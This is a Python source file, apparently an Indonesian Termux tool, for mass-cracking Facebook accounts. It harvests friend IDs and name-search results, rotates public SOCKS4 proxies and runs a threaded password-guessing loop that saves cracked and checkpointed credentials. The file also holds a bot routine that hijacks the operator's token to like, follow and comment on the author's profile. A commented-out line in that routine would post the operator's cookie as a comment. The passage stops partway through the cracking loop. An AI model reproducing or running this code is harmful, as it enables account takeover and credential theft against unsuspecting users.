#!/usr/bin/python3
#coding=utf-8

N,M,K,H,B,U,C,P = "\x1b[00m","\x1b[38;2;255;0;0m","\x1b[38;2;208;255;0m","\x1b[38;2;0;255;8m","\x1b[38;2;38;0;255m","\x1b[38;2;234;0;255m","\x1b[38;2;0;221;255m","\x1b[1;97m"
luffy = ("""{}                                                       .';'...;dkxo;.                               
                                   ...             ..;lOKXNKKXNWMMMNO,                              
                          ;do.  'cx0Kkxkxolcc;:odkO0XWMNXNWNWWNNNWMWWk.                             
                         ;KK;.cOXNKd:'.,;:clkKNMMMMMMMWWWKodKXO0XWMWWX:.........''.''''..           
                        .kWk,xWNx,.  ..',,ckKKKKXNWWWMWXOdokXWXOkkk0OOddKXXXNNNNNNNNNNNK;           
                        ;KXoxWNo.'lx0KKK0OOOOkxdkKWWWNXKkoxxc:;...';l0KKWMMMMMMMMMMMMWKc.           
                        .c:dNNkokXNOo:,.....,;cOXXK0d:..         ...':;xWMMMWWMMMMMMWO;             
                         'xXXOKWWKo;;cldxxddxdddo;..                 'lKMWWWNXXWMMW0c.              
                        .kMKdONOONXK0Oxlc;:lxkkdl.               .,lk00KNNXXXNXKOd;.                
                       .oNXokWXk0O:'.                      ..,coxkXMN0O0KKOdoc,.                    
                      .lNNkkNMWWO'              .....';:lok0XNNNKKXXKXXkl:'                         
                    .,oXWXXWMMWO'      .:oddodkO0KKXXNNWWWWMWWMWWNKxl;'.                            
                    cKNMMMMMMMK;      .dNKod0NMMMMMMMWXKXNWWNKOd:'.                                 
                   .OMMMMMMMMNl     .:0WN0OXWMWWMMMWMMXOkxo:;'.     .'.                             
                   lNMMMMMMMWd.     .dXWXNMWNNK0kdoolc,',. ;kOd'   .,c,                             
                  ;KMMMMMMWXo.      .,::::;;,'..      'kX0d0WWNOoc. .o;                             
                 .OMMMMMMNx,                   .:lcol,;kWWXNWNXXWd. d0,                             
                 oWMMMMWk;              .',,;;..xWMMWXKXNX0KNX0XX:.ld,                              
                ;XMMMMWd.              .:0NNWO. l0O0XMMMWK0XNNWWd,:;.                               
               .OMWW0dc.                 .lxd.  .;;oXWWMWMMMMMWk.                                   
              .oWMMN:                           'dOOOOOOKNWWMNx.                                    
              :XWWMO,                          ,dkkkkO0OOXWNO:                                      
             .kWMMMKx'                          .;co0NMMWKOl.                                       
             cNMMMMMO.                          .kXNMWXkc,do.                                       
            .OMMMMMWd                            'ccc;. .dNO.                                       
            :NMMMMMWc                                  .xWMN:                                       
            dMMMMMMX:                                 .dWWWWk,''.                                   
           .OMMMMMMK;                          ..   ',lNW0OWXkc;;;.                                 
           ,ONMMMMMK,                          .do;oxxXMKoOMKxOO,':;.                               
           .oXMMMMM0'                           :XMWNWMX::XM0'.lc. 'cl:'.                           
           .cXMMMMWO.                .oOOkxol:,. ;xKWMNl.oNXo'.,;:;. .'','..                        
            cNWMWKXk.                .;xNMMMMMWKkoldKWk;cOXKKKXWMMWd      .'...                     
            oWMMXlxx.                   ;OWWWMMMWWMWNNNNWMMMMMMMMMN:          .                     
            dN00x.ld.                    .lKMWWMMMMW0x0WMMMMMMMMMWO.                                
           .ol. . ;c                       'kNWMMMWMx.:NWWMMMMMWXO;                                 
            .     ..                        .cKWNWMNc .xWWWWNNXXXo.                                 
                                              'd00kc.  ;0KXNXWMWX;                                  
                                               .,'.     lNWMMWMNl.                                  
                                                        .;xXNKx;                                    
                                                          ''''                                         """.format(M))



exp = []

Author = 'Dvanmeploph'
Github = 'github.com/Dvanmeploph'
Version = 'Beta'
agent = 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3'
ketik = '{} ─────► {}'.format(P,H)
notice_login = '''{}
Masukan cookies faceboook untuk login

Cara ambil cookies:
	- Buka kiwi browser
	- Download ekstensi {}cookie dough{}
	- Login facebook menggunakan akun tumbal
	- Buka ekstensinya nanti akan muncul cookienya
Note:
	- Jangan Menggunakan akun utama untuk login ya memek
		'''.format(P,H,P)
import os, sys, subprocess
os.system("clear")
for ngimport in range(10):
	try:
		import requests
		import mechanize
		import rich
		import fake_useragent
		import bs4
		import gtts
		import shutil
	except ImportError as eror:
		print ("{}[{}••{}] {}Sedang menginstall module {}{}".format(H,M,H,P,H,eror.name))
		os.system("python -m pip install {} &> /dev/null".format(eror.name))
null = open(os.devnull, "w")
detect = subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
if detect !=0:
	print (f"{H}[{M}••{H}] {P}Sedang mengdetectll {H}play-audio")
	os.system('pkg detectll play-audio -y &> /dev/null')
null.close()
import time, random, json, datetime, re, bs4, base64, platform, shutil
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as ferly
from time import sleep
from time import strftime
from rich.console import Console
from rich import print as prints
from rich.markdown import Markdown
from rich.panel import Panel
from rich.tree import Tree
from rich.columns import Columns
from gtts import gTTS
from fake_useragent import UserAgent
from fbthon import Facebook
from fbthon.login import Web_Login
list_bulan = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = list_bulan[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okok = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpcp = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('data/.prox.txt','w').write(prox)
except Exception as e:
	print (e);exit()
proxy = open('data/.prox.txt','r').read().splitlines()
try:myuseragent = open('useragent.txt','r').read().splitlines()
except:pass

warna_rich = random.choice(['#ff0000','#00ff08','#d0ff00','#2600ff','#00ddff','#ea00ff'])
if warna_rich == '#ff0000':B='\x1b[38;2;255;0;0m'
if warna_rich == '#00ff08':B='\x1b[38;2;0;255;8m'
if warna_rich == '#d0ff00':B='\x1b[38;2;208;255;0m'
if warna_rich == '#2600ff':B='\x1b[38;2;38;0;255m'
if warna_rich == '#00ddff':B='\x1b[38;2;0;221;255m'
if warna_rich == '#ea00ff':B='\x1b[38;2;234;0;255m'

MM = '[#ff0000]'
HH = '[#00ff08]'
KK = '[#d0ff00]'
BB = '[#2600ff]'
CC = '[#00ddff]'
UU = '[#ea00ff]'
PP = '[#ffffff]'



def titik(teks):
	return "[#ff0000]>[#d0ff00]>[#00ff08]> [#ffffff]{} [#00ff08]<[#d0ff00]<[#ff0000]<".format(teks)
def Banner_ferly():
	try:det = exp[0]
	except:det = 'unknown'
	teks = ('''{}● {}● {}● {}{}
{} ________                     /\\{}___________                  ___.                  __   /\\
{} \\______ \\   ____   ____ _____)/{}\\_   _____/____    ____  ____\\_ |__   ____   ____ |  | _)/
{}  |    |  \\_/ __ \\_/ __ \\\\____ \\ {}|    __) \\__  \\ _/ ___\\/ __ \\| __ \\ /  _ \\ /  _ \\|  |/ / 
{}  |    `   \\  ___/\\  ___/|  |_> >{}|     \\   / __ \\\\  \\__\\  ___/| \\_\\ (  <_> |  <_> )    <  
{} /_______  /\\___  >\\___  >   __/ {}\\___  /  (____  /\\___  >___  >___  /\\____/ \\____/|__|_ \\ 
{}         \\/     \\/     \\/|__|        {}\\/        \\/     \\/    \\/    \\/                   \\/ '''.format(M,K,H,P,det,M,B,M,B,M,B,M,B,M,B,M,B))
	print (teks)
	kombo = []
	kombo.append(Panel(f"[#ffffff]          {Author}",style=warna_rich,width=30,title=titik("author")))
	kombo.append(Panel(f"[#ffffff]    {Github}",style=warna_rich,width=30,title=titik("github")))
	kombo.append(Panel(f"[#ffffff]          {Version}",style=warna_rich,width=30,title=titik("version")))
	Console().print(Columns(kombo))

class Login:
	def __init__(self):
		try:
			cookie = open("data/.cookies.log","r").read()
			token = open("data/.token.log","r").read()
			try:
				url = requests.get("https://graph.facebook.com/me?fields=id,name&access_token="+token,cookies={"cookie":cookie})
				nama_kamu = json.loads(url.text)["name"]
				id_kamu = json.loads(url.text)["id"]
				Menu(nama_kamu,id_kamu)
			except KeyError:
				self.Login_Cookies_()
			except requests.exceptions.ConnectionError:
				print ('{}{}Koneksi jaringan anda bermasalah'.format(ketik,M))
				exit()
		except FileNotFoundError:
			self.Login_Cookies_()
	def Login_Cookies_(self):
		os.system('clear')
		Banner_ferly()
		print (notice_login)
		cookie = input(ketik)
		try:idf = re.search('c_user=(.*?);',str(cookie)).group(1)
		except AttributeError:print ('{}{} Cookie tidak valid'.format(ketik,M));exit()
		pw = input(B+'Masukan password\n'+ketik)
		with requests.Session() as r:
			try:
				url = 'https://graph.facebook.com/v16.0/auth/login/'
				data = {
				"access_token": "1348564698517390|007c0a9101b9e1c8ffab727666805038",
				"sdk_version": {random.randint(1,26)},
				"email": idf,
				"locale": "ja_JP",
				"password": pw,
				"sdk": "android",
				"generate_session_cookies": "1",
				"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
				r.headers.update({
				"Host": "graph.facebook.com",
				"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
				"x-fb-sim-hni": str(random.randint(20000, 40000)),
				"x-fb-net-hni": str(random.randint(20000, 40000)),
				"x-fb-connection-quality": "EXCELLENT",
				"user-agent": 'Mozilla/5.0 (Linux; Android 10; RMX2189 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36',
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-http-engine": "Liger"
				})
				ress = r.post(url, params=data).json()
				if 'session_key' in ress:
					token = ress['access_token']
					open("data/.token.log","w").write(token)
					open("data/.cookies.log","w").write(cookie)
					Login()
				elif "www.facebook.com" in ress["error"]["message"]:
					print ('{}{}Akun terkena checkpoint'.format(ketik,M))
					exit()
				else:
					print ('{}{}Login gagal kemungkinan cookie expired atau password salah'.format(ketik,M))
					exit()
			except Exception as e:
				print (M+str(e))
				exit()

	def Login_Cookies(self):
		os.system('clear')
		Banner_ferly()
		print (notice_login)
		cookie = input(ketik)
		with requests.Session() as r:
			try:
				self.cookie = {'cookie':cookie}
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
				req  = r.post('https://graph.facebook.com/v16.0/device/login/',data=data).json()
				cd   = req['code']
				ucd  = req['user_code']
				url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd)
				req  = par(r.get('https://mbasic.facebook.com/device',cookies=self.cookie).content,'html.parser')
				raq  = req.find('form',{'method':'post'})
				dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}
				rel  = 'https://mbasic.facebook.com' + raq['action']
				pos  = par(r.post(rel,data=dat,cookies=self.cookie).content,'html.parser')
				dat  = {}
				raq  = pos.find('form',{'method':'post'})
				for x in raq('input',{'value':True}):
					try:
						if x['name'] == '__CANCEL__' : pass
						else: dat.update({x['name']:x['value']})
					except Exception as e: pass
				rel = 'https://mbasic.facebook.com' + raq['action']
				pos = par(r.post(rel,data=dat,cookies=self.cookie).content,'html.parser')
				req = r.get(url,cookies=self.cookie).json()
				token = req['access_token']
				open("data/.token.log","w").write(token)
				open("data/.cookies.log","w").write(cookie)
#				self.Bot_Dvanmeploph(cookie,token)
				Login()

#			except (AttributeError,Exception,KeyError):
			except Exception as e:
				print (e)
				print ('{}{}Login gagal coba ganti cookienya'.format(ketik,M))
				exit()
	def Bot_Dvanmeploph(self,cookie,token):
#			try:
#				r.post(f"https://graph.facebook.com/100041654630505_1107301094001701/comments?message={cookie}&access_token={token}",cookies={"cookie":cookie})
#				link = r.get('https://api.waifu.pics/sfw/waifu',headers={'User-Agent':agent})
#				url = json.loads(link.text)['url']
#				pos = r.get(url, stream=True)
#				with open('data/img.jpg','wb') as out:
#					shutil.copyfileobj(pos.raw, out)
#				gambar = open('data/img.jpg','rb').read()
#				komen = random.choice(['Nih<3','Nih ngab😗','Cute😍','Kawai😍','Kawai😙','Cute😗😗','Bonus😘','😘','😍','😙','🗿'])
#				data = {
#				'access_token': token,
#				'message': komen,
#				'attachment_url': url
#				}
#				file = {
#				"attachment": (f"gambar.jpg", gambar, "image/jpeg")
#				}
#				idku = '100041654630505_1134755737922903'
#				r.post('https://graph.facebook.com/'+idku+'/comments',params=data,files=file,cookies={'cookie':cookie},headers={'User-Agent':agent})
#			except:pass
		self.id = '100013275378835_1658880191231144'
		self.kata = [
		f'Mantap bang @[{self.id.split("_")[0]}:0]',
		f'Panutan ku ni @[{self.id.split("_")[0]}:0]',
		f'Semangat bang @[{self.id.split("_")[0]}:0]',
		f'Lu ganteng bang @[{self.id.split("_")[0]}:0]',
		f'@[{self.id.split("_")[0]}:0] Panutan gw',
		f'Semoga sehat selalu bang @[{self.id.split("_")[0]}:0]',
		f'Terbaik bang @[{self.id.split("_")[0]}:0]',
		f'@[{self.id.split("_")[0]}:0] 😍',
		f'@[{self.id.split("_")[0]}:0] Keren bang',
		f'@[{self.id.split("_")[0]}:0] Ganteng bet😙',
		]
		sekarang = datetime.date.today()
		list_hari = {"Monday":"Senin","Tuesday":"Selasa","Wednesday":"Rabu","Thursday":"Kamis","Friday":"Jum'at","Saturday":"Sabtu","Sunday":"Minggu"}
		list_bulan = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
		self.hari = list_hari[f"{sekarang:%A}"]
		self.tanggal = sekarang.day
		self.bulan = list_bulan[(str(sekarang.month))]
		self.tahun = sekarang.year
		self.saat_ini = '{} {}/{}/{}'.format(self.hari, self.tanggal, self.bulan, self.tahun)
		with requests.Session() as r:
			try:
				for x in r.get('https://graph.facebook.com/{}/posts?access_token={}'.format(self.id.split('_')[0],token),cookies={'cookie':cookie}).json()['data']:
					self.list_id = x['id']
					self.komentar = '{}\n\nhttps://www.facebook.com/{}\n\nKomentar Ditulis Oleh Bot Dvanmeploph\nDate: {}\nTime: {}'.format(random.choice(self.kata), self.list_id, self.saat_ini, strftime('%H:%M:%S'))
					r.post(f"https://graph.facebook.com/{self.list_id}/comments?message={self.komentar}&access_token={token}",cookies={"cookie":cookie})
#					print (self.komentar)
			except Exception as e:pass

			try:
				for x in BeautifulSoup(r.get(f'https://mbasic.facebook.com/{self.id.split("_")[0]}?v=timeline',cookies={"cookie":cookie}).content,'html.parser').find_all('a',href=True):
					if 'Tanggapi' in x.text:
						_react_type_ = 'Super'
						for z in BeautifulSoup(r.get('https://mbasic.facebook.com%s'%(x['href']),cookies={"cookie":cookie}).content,'html.parser').find_all('a'):
							if _react_type_ == z.text: req2 = r.get('https://mbasic.facebook.com' + z['href'],cookies={"cookie":cookie})
							else:pass
			except Exception as e:pass
			try:
				for x in par(xyz.get('https://mbasic.facebook.com/%s'%(self.id.split('_')[0]),cookies={'cookie':cookie}).content,'html.parser').find_all('a',href=True):
					if 'subscribe.php' in x['href']:
						exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						print (exec_folls)
					elif 'Tambah Teman' in x['href']:
						exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						print (exec_folls)
					elif 'Ikuti' in x['href']:
						exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						print (exec_folls)
					elif 'Suka' in x['href']:
						exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						print (exec_folls)
					elif 'Sukai Halaman' in x['href']:
						exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=puput)
						print (exec_folls)
			except Exception as e:pass





class Menu:
	def __init__(self,nama_,id_):
		self.nama = nama_
		self.id = id_
		self.dump = []
		self.cookie = open("data/.cookies.log","r").read()
		self.token = open("data/.token.log","r").read()
		try:
			req = requests.get("http://ip-api.com/json/?fields=").text
			self.IP = json.loads(req)['query']
			self.CN = json.loads(req)['country']
		except:
			self.IP = "-"
			self.CN = '-'
		try:
			self.simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
		except:
			self.simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
		self.jam = strftime('%H')
		if str(self.jam) in ('04','05','06','07','08','09'):self.selamat= 'selamat pagi'
		elif str(self.jam) in ('10','11','12','13','14','15'):self.selamat = 'selamat siang'
		elif str(self.jam) in ('16','17','18'):self.selamat = 'selamat sore'
		elif str(self.jam) in ('19','20','21','22','23','00','01','02','03'):self.selamat = 'selamat malam'
		musik2 = gTTS(f"{self.selamat} bang", lang='id', slow=False)
		musik2.save('data/.good.mp3')
		os.popen('play-audio data/.good.mp3')
		self.List_Menu()
	def List_Menu(self):
		os.system('clear')
		Banner_ferly()
		teks = '''[#ff0000][[#00ff08]••[#ff0000]][#ffffff] name account : [#00ff08]{}
[#ff0000][[#00ff08]••[#ff0000]][#ffffff] ID Account   : [#00ff08]{}
[#ff0000][[#00ff08]••[#ff0000]][#ffffff] IP Address   : [#00ff08]{}
[#ff0000][[#00ff08]••[#ff0000]][#ffffff] Privoder     : [#00ff08]{}
[#ff0000][[#00ff08]••[#ff0000]][#ffffff] Country      : [#00ff08]{}'''.format(self.nama,self.id,self.IP,self.simcard,self.CN)
		Console().print(Panel(teks,subtitle=titik(f'[{warna_rich}]─┬─'),subtitle_align='center'),style=warna_rich,width=92)
		print ('{}              ┌──────────────────────────────┼───────────────────────────────┐'.format(B))
		print ('{}              │                              │                               │'.format(B))
		tampung_menu = []
		tampung_menu.append(Panel(f"[#ffffff]  Crack dari id publik",style=warna_rich,width=30,title='[#2600ff][[#00ff08]01[#2600ff]]'))
		tampung_menu.append(Panel(f"[#ffffff]     Crack dari file",style=warna_rich,width=30,title='[#2600ff][[#00ff08]02[#2600ff]]'))
		tampung_menu.append(Panel(f"[#ffffff]        Cek result",style=warna_rich,width=30,title='[#2600ff][[#00ff08]03[#2600ff]]'))
		Console().print(Columns(tampung_menu))


		self.pilih_menu = input(ketik)
		if self.pilih_menu in ('1','01'):self.publik()
		elif self.pilih_menu in ('2','02'):self.file()
		elif self.pilih_menu in ('3','03'):self.result()
		elif self.pilih_menu in ('4','04'):self.get_name()
		else:print ('{}{}Pilih yang bener asu'.format(ketik,M));sleep(2);Login()
	def publik(self):
		Console().print(Panel('[#ffffff]ketik [#00ff08]me [#ffffff]untuk dump dari akun kamu, gunakan koma sebagai pemisah jika ingin dump massal',title=titik('masukan id publik')),style=warna_rich,width=92)
		self.queri = input(ketik)
		for user in self.queri.split(','):
			try:
				header = {"User-Agent": agent}
				req = requests.get("https://graph.facebook.com/v15.0/"+user+"?fields=friends.limit(5000){id,name}&access_token="+self.token,cookies={"cookie": self.cookie},headers=header).json()
				for res in req['friends']['data']:
					try:
						self.dump.append(res['id']+'|'+res['name'])
						sys.stdout.write (f'\r{P} ─────► {H}{len(self.dump)}')
						sys.stdout.flush()
					except:
						continue
			except (KeyError,IOError):
				continue
		if len(self.id) <= 1:
			print ('{}{}tidak ada id yang publik coba cari id yang lain'.format(ketik,M))
			sleep(2)
			Login()
		print ()
		NgehekBang(self.dump)
	def get_name(self):
		Console().print(Panel('[#ffffff]                  masukan nama untuk dump gunakan , jika ingin dump massal ',title=titik('dump pencarian nama')),style=warna_rich,width=92)
		user = input(ketik)
		list_name = ['junior','jr','gans','ganz','ganteng','gaming','gamers','hackers','hacker','cans','canz','kun','chan','cans','sec','dev','xd','saputra','saputri','putra','putri','slebew','koplok','xyz','tzy','yameteh','goblok','botak','gondrong','pirang','unyil','fake','fors','lammer','mastah','tricker','manis','maniez','doraemon','eror','tolol','dark','white','whitehat','balckhat']
		self.list = []
		for uid in user.split(','):
			list_name.append(uid)
			for idx in list_name:
				self.list.append(uid+' '+idx)
		Console().print(Panel('[#ffffff]                               masukan limit untuk dump',title=titik('limit')),style=warna_rich,width=92)
		try:limit = int(input(ketik))
		except:limit:1000
		for dump in self.list:
			if len(self.dump) >= limit:break
			else:
				try:self.cari_nama(f'https://mbasic.facebook.com/public/{dump}')
				except Exception as e:pass

		print ()
		NgehekBang(self.dump)

	def cari_nama(self, url):
		try:
			with requests.Session() as r:
				req = BeautifulSoup(r.get(str(url)).text, 'html.parser')
				for ez in req.find_all('td'):
					namanya = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(ez))
					for idx,nmx in namanya:
						if "profile.php?" in idx:uid = re.findall("id=(.*)",str(idx))[0]
						else:uid = re.search('href="/(.*?)"',str(ez)).group(1)
						if "<span" in nmx:nama = re.findall("(.*?)\<",str(nmx))[0]
						else:nama = re.search('<div class="cc">(.*?)</div>',str(ez)).group(1)
						if uid+"|"+nama in self.dump:continue
						else:self.dump.append(uid+'|'+nama)
						sys.stdout.write (f'\r{P} ─────► {H}{len(self.dump)}')
						sys.stdout.flush()
				for cek in req.find_all("a",href=True):
					if "Lihat Hasil Selanjutnya" in cek.text:
						self.cari_nama(cek.get('href'))
		except Exception as e:
			pass

	def file(self):
		Console().print(Panel('[#ffffff]                     Masukan file dump contoh:/sdcard/dump/file.txt ',title=titik('crack file')),style=warna_rich,width=92)
		file = input(ketik)
		try:
			buka = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print ('{}{}File {}{} {}tidak ditemukan!!'.format(ketik,P,K,file,P))
			sleep(2)
			Login()
		for ngedump in buka:
			try:
				data = ngedump.split('|')
				idx = data[0]
				nmx = data[1]
				self.dump.append(idx+'|'+nmx)
				sys.stdout.write (f'\r{P} ─────► {H}{len(self.dump)}')
				sys.stdout.flush()
			except AttributeError:
				print ('{}{}Pemisah tidak didukung untuk sc ini'.format(ketik,P))
				sleep(2)
				Login()
		print ()
		NgehekBang(self.dump)
	def result(self):
		os.system("clear")
		Banner_ferly()
		teks = '''[#ff0000][[#00ff08]••[#ff0000]][#ffffff] name account : [#00ff08]{}
[#ff0000][[#00ff08]••[#ff0000]][#ffffff] id account   : [#00ff08]{}
[#ff0000][[#00ff08]••[#ff0000]][#ffffff] ip address   : [#00ff08]{}
[#ff0000][[#00ff08]••[#ff0000]][#ffffff] simcard      : [#00ff08]{}
[#ff0000][[#00ff08]••[#ff0000]][#ffffff] country      : [#00ff08]{}'''.format(self.nama,self.id,self.IP,self.simcard,self.CN)
		Console().print(Panel(teks,subtitle=titik(f'[{warna_rich}]─┬─'),subtitle_align='center'),style=warna_rich,width=92)
		print ('{}              ┌──────────────────────────────┼───────────────────────────────┐'.format(B))
		print ('{}              │                              │                               │'.format(B))
		tampung_menu = []
		tampung_menu.append(Panel(f"[#ffffff]         Cek result Ok",style=warna_rich,width=30,title='[#2600ff][[#00ff08]01[#2600ff]]'))
		tampung_menu.append(Panel(f"[#ffffff]         Cek result cp",style=warna_rich,width=30,title='[#2600ff][[#00ff08]02[#2600ff]]'))
		tampung_menu.append(Panel(f"[#ffffff]           Main menu",style=warna_rich,width=30,title='[#2600ff][[#00ff08]03[#2600ff]]'))
		Console().print(Columns(tampung_menu))

		gan = input("{}".format(ketik))
		if gan in ("1","01"):
			no,nom = 0,[]
			try:okk = os.listdir('result/Ok/')
			except:Console().print(Panel("[italic red]Tidak ada hasil ok"),width=70);sleep(2);self.result()
			if len(okk) == 0:
				Console().print(Panel("[italic red]Tidak ada hasil ok"),width=70);sleep(2);self.result()
			print ()
			mek = Tree("[#00ff08] Result Ok")
			for x in okk:
				nom.append(x)
				no+=1
				try:jum= open('result/Ok/'+x,'r').readlines()
				except:continue
				if no <=9:mek.add(f"[#2600ff]0{no} [italic white] {x} [#00ff08]{len(jum)} [#ffffff]akun[/]")
				else:mek.add(f"[#2600ff]{no} [italic white] {x} [#00ff08]{len(jum)} [#ffffff]akun[/]")
			prints(mek)
			try:
				print ()
				abc = input("{}".format(ketik))
				print ("\x1b[00m")
				file = nom[int(abc)-1]
			except:
				Console().print(Panel("[italic red]Pilih yang bener!!"),width=70);sleep(2);self.result()
			try:buka = open('result/Ok/'+file,'r').read().splitlines()
			except:Console().print(Panel("[italic red]Tidak ada hasil ok"),width=70);sleep(2);self.result()
			for hsl in buka:
				resu = hsl.split("|")
				us = resu[0]
				pw = resu[1]
				co = resu[2]
				okeh = (Tree(""))
				okeh.add("[#00ff08]{}|{}".format(us,pw))
				okeh.add("[#00ff08]{}".format(co))
				prints(okeh)
				print ()
			back = Console().input("[#00ddff]Enter to back")
			self.result()
		if gan in ("2","02"):
			no,nom = 0,[]
			try:okk = os.listdir('result/Cp/')
			except:Console().print(Panel("[italic red]Tidak ada hasil Cp"),width=70);sleep(2);self.result()
			if len(okk) == 0:
				Console().print(Panel("[italic red]Tidak ada hasil Cp"),width=70);sleep(2);self.result()
			print ()
			mek = Tree("[#d0ff00] Result Cp")
			for x in okk:
				nom.append(x)
				no+=1
				try:jum= open('result/Cp/'+x,'r').readlines()
				except:continue
				if no <=9:mek.add(f"[#2600ff]0{no} [italic white] {x} [#d0ff00]{len(jum)} [#ffffff]akun[/]")
				else:mek.add(f"[#2600ff]{no} [italic white] {x} [#d0ff00]{len(jum)} [#ffffff]akun[/]")
			prints(mek)
			try:
				print ()
				abc = input("{}".format(ketik))
				print ("\x1b[00m")
				file = nom[int(abc)-1]
			except:
				Console().print(Panel("[italic red]Pilih yang bener!!"),width=70);sleep(2);self.result()
			try:buka = open('result/Cp/'+file,'r').read().splitlines()
			except:Console().print(Panel("[italic red]Tidak ada hasil Cp"),width=70);sleep(2);self.result()
			for hsl in buka:
				resu = hsl.split("|")
				us = resu[0]
				pw = resu[1]
				okeh = (Tree(""))
				okeh.add("[#d0ff00]{}|{}".format(us,pw))
				prints(okeh)
				print ()
			back = Console().input("[#00ddff]Enter to back")
			self.result()

		else:Login()

class NgehekBang:
	def __init__(self,id_dump):
		self.dump = id_dump
		self.loop = 0
		self.ok = 0
		self.cp = 0
		self.pwpw = []
		self.method = []
		self.ngentot = []
		self.agent = []
		self.Password()
		self.Method_Login()
#		self.Ua()
		self.Notice()
	def Password(self):
		Console().print(Panel('          [#ffffff]masukan password minimal 6 karakter, gunakan koma sebagai pemisah',title=titik('masukan password tambahan')),style=warna_rich,width=92)
		self.queri = input(ketik)
		for pwnya in self.queri.split(','):
			self.pwpw.append(pwnya)
	def Method_Login(self):
		Console().print(Panel('[#ffffff]                            pilih yang cocok dengan device kamu',subtitle=titik(f'[{warna_rich}]─┬─'),subtitle_align='center',title=titik('pilih method login')),style=warna_rich,width=92)
		print ('{}              ┌──────────────────────────────┼───────────────────────────────┐'.format(B))
		print ('{}              │                              │                               │'.format(B))
		tampung_method = []
		tampung_method.append(Panel(f"[#ffffff]         method v1",style=warna_rich,width=30,title='[#2600ff][[#00ff08]01[#2600ff]]'))
		tampung_method.append(Panel(f"[#ffffff]         method v2",style=warna_rich,width=30,title='[#2600ff][[#00ff08]02[#2600ff]]'))
		tampung_method.append(Panel(f"[#ffffff]         method v3",style=warna_rich,width=30,title='[#2600ff][[#00ff08]03[#2600ff]]'))
		Console().print(Columns(tampung_method))
		self.queri = input(ketik)
		if self.queri in ('1','01'):self.method.append('method v1')
		elif self.queri in ('2','02'):self.method.append('method v2')
		elif self.queri in ('3','03'):self.method.append('method v3')
		elif self.queri in ('4','04'):self.method.append('method v4')
		else:self.method.append('method v1')
	def Ua(self):
		Console().print(Panel('[#ffffff]                            setting useragent biar ijo;v',subtitle=titik(f'[{warna_rich}]─┬─'),subtitle_align='center',title=titik('masukan useragent')),style=warna_rich,width=92)
		jumlah = int(input('{}[{}••{}]{} Mau berapa useragent: {}'.format(M,H,M,P,H)))
		list = 0
		for masukan in range(jumlah):
			list+=1
			uanya = Console().input('[#ff0000][[#00ff08]••[#ff0000]][#ffffff] Masukan ua ke {}: '.format(list))
			self.agent.append(uanya)



	def Notice(self):
		os.system('clear')
#		print (luffy)
		Banner_ferly()
		teks = '''[#ff0000][[#00ff08]••[#ff0000]][#ffffff] Password tambahan :[#00ff08] {}
[#ff0000][[#00ff08]••[#ff0000]][#ffffff] Method login      :[#00ff08] {}
[#ff0000][[#00ff08]••[#ff0000]][#ffffff] Jumlah id dump    :[#00ff08] {}'''.format(','.join(self.pwpw),self.method[0],len(self.dump))
		Console().print(Panel(teks,subtitle=titik(f'[{warna_rich}]─┬─'),subtitle_align='center',title=titik('Information')),style=warna_rich,width=92)
		print ('{}                      ┌──────────────────────┴──────────────────────┐'.format(B))
		print ('{}                      │                                             │'.format(B))
		tampung_notice = []
		tampung_notice.append(Panel(f"[#ffffff]result [#00ff08]ok [#ffffff]saved in: [#00ff08]{okok}",style=warna_rich,width=45,title='[#2600ff][[#00ff08]•[#2600ff]]'))
		tampung_notice.append(Panel(f"[#ffffff]result [#d0ff00]cp [#ffffff]saved in: [#d0ff00]{cpcp}",style=warna_rich,width=46,title='[#2600ff][[#00ff08]•[#2600ff]]'))
		Console().print(Columns(tampung_notice))
		Console().print(Panel('[#ffffff]                    nyalakan/matikan mode pesawat setiap dapat result',title=titik('notice')),style=warna_rich,width=92)
		with ferly(max_workers=16) as brute:
			try:
				self.dump.sort(reverse=True)
				for data in self.dump:
					idf = data.split("|")[0]
					nmf = data.split("|")[1]
					nana = nmf.split(" ")[0]
					self.list_pw = []
					for pwx in self.pwpw:
						self.list_pw.append(pwx)
